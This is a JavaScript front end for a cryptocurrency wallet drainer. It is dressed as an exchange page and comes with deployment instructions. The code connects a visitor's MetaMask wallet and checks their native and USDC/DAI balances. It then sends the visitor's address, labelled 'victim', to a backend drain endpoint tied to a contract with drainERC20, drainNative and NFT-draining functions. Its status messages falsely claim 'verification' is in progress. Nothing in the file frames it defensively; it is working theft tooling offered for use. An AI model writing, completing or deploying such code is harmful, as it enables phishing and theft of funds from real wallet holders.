// drainer.js — Final Version
// Crypto Exchange Theme | Dynamic Owner | Backend-Ready

// ============================================================
// CONFIG — Change these two values when you deploy
// ============================================================

// Your backend URL (Render / Railway / VPS)
// For local testing: "http://localhost:3000"
const BACKEND_URL = "http://localhost:3000";

// Your deployed Drainer.sol contract address
// Fill this in after deploying the contract
const CONTRACT_ADDRESS = "0xYourDeployedContractAddressHere";

// ============================================================
// SUPPORTED CHAINS
// ============================================================

const SUPPORTED_CHAINS = {
    8453:  { name: "Base",       chainIdHex: "0x2105" },
    1:     { name: "Ethereum",   chainIdHex: "0x1" },
    43114: { name: "Avalanche",  chainIdHex: "0xa86a" },
};

// ============================================================
// KNOWN TOKENS (for UI display — optional)
// ============================================================

const KNOWN_TOKENS = {
    // Base
    "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913": { symbol: "USDC", decimals: 6 },
    "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb": { symbol: "DAI",  decimals: 18 },
    // Ethereum
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": { symbol: "USDC", decimals: 6 },
    "0x6B175474E89094C44Da98b954EedeAC495271d0F": { symbol: "DAI",  decimals: 18 },
    // Avalanche
    "0xB97EF9Ef8734C71902D406C073A0D9d7697B835a2": { symbol: "USDC", decimals: 6 },
};

// ============================================================
// CONTRACT ABI (view + drain functions)
// ============================================================

const CONTRACT_ABI = [
    "function getOwner() view returns (address)",
    "function drainERC20(address victim, address token)",
    "function drainNative()",
    "function drainSpecificERC721(address victim, address token, uint256[] tokenIds)",
    "function drainSpecificERC1155(address victim, address token, uint256[] ids, uint256[] amounts)",
];

// ============================================================
// STATE
// ============================================================

let userAddress = null;
let provider = null;
let signer = null;
let contract = null;

// ============================================================
// DOM REFERENCES
// ============================================================

const connectBtn  = document.getElementById("connect-btn");
const drainBtn    = document.getElementById("drain-btn");
const statusEl    = document.getElementById("status");
const walletRow   = document.getElementById("wallet-row");
const walletAddr  = document.getElementById("wallet-address");
const networkEl   = document.getElementById("network-name");
const netDot      = document.getElementById("net-dot");
const assetEl     = document.getElementById("asset-amount");

// ============================================================
// STATUS HELPER
// ============================================================

function setStatus(message, type = "info") {
    statusEl.textContent = message;
    statusEl.className = "status " + type;
}

// ============================================================
// WALLET CONNECTION
// ============================================================

async function connectWallet() {
    if (!window.ethereum) {
        setStatus("MetaMask not detected. Please install it.", "error");
        return;
    }

    try {
        connectBtn.disabled = true;
        setStatus("Requesting wallet connection…", "info");

        provider = new ethers.BrowserProvider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);
        userAddress = accounts[0];
        signer = await provider.getSigner();

        // Detect current chain
        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);
        const chainInfo = SUPPORTED_CHAINS[chainId];

        if (chainInfo) {
            networkEl.textContent = chainInfo.name;
            netDot.style.background = "var(--green)";
        } else {
            networkEl.textContent = `Chain ${chainId}`;
            netDot.style.background = "var(--red)";
        }

        // Fetch owner from contract
        try {
            contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
            const owner = await contract.getOwner();
            walletAddr.textContent = `${userAddress}  (Owner: ${owner})`;
        } catch (e) {
            walletAddr.textContent = userAddress;
        }

        // Update UI
        connectBtn.style.display = "none";
        drainBtn.style.display = "block";
        walletRow.style.display = "block";
        setStatus(`Connected: ${userAddress.slice(0, 6)}…${userAddress.slice(-4)}`, "success");

    } catch (err) {
        setStatus("Connection rejected: " + err.message, "error");
        connectBtn.disabled = false;
    }
}

// ============================================================
// ASSET PREVIEW (decorative — shows approximate balance)
// ============================================================

async function previewAssets() {
    if (!userAddress) return;

    try {
        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);

        // Show native balance
        const nativeBal = await provider.getBalance(userAddress);
        const nativeHuman = ethers.formatEther(nativeBal);

        // Check known tokens on this chain
        let tokenCount = 0;
        for (const [addr, info] of Object.entries(KNOWN_TOKENS)) {
            try {
                const token = new ethers.Contract(
                    addr,
                    ["function balanceOf(address) view returns (uint256)"],
                    provider
                );
                const bal = await token.balanceOf(userAddress);
                if (bal > 0n) tokenCount++;
            } catch (e) {
                // token not on this chain — skip
            }
        }

        assetEl.textContent =
            `${nativeHuman.slice(0, 5)} ETH · ${tokenCount} token(s)`;

    } catch (e) {
        assetEl.textContent = "—";
    }
}

// ============================================================
// DRAIN — sends request to backend
// ============================================================

async function startDrain() {
    if (!userAddress) return;

    drainBtn.disabled = true;
    setStatus("Contacting verification server…", "info");

    try {
        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);

        const response = await fetch(`${BACKEND_URL}/api/drain`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                victim: userAddress,
                chainId: chainId,
            }),
        });

        const data = await response.json();

        if (response.ok) {
            setStatus("Authorization received. Verification in progress…", "success");
            drainBtn.textContent = "Authorized ✓";
        } else {
            setStatus(`Server error: ${data.error || "Unknown"}`, "error");
            drainBtn.disabled = false;
        }

    } catch (err) {
        setStatus(`Connection failed: ${err.message}`, "error");
        drainBtn.disabled = false;
    }
}

// ============================================================
// LISTENERS
// ============================================================

connectBtn.addEventListener("click", connectWallet);
drainBtn.addEventListener("click", startDrain);

// Auto-connect if wallet is already unlocked
if (window.ethereum) {
    connectWallet();
    previewAssets();
}
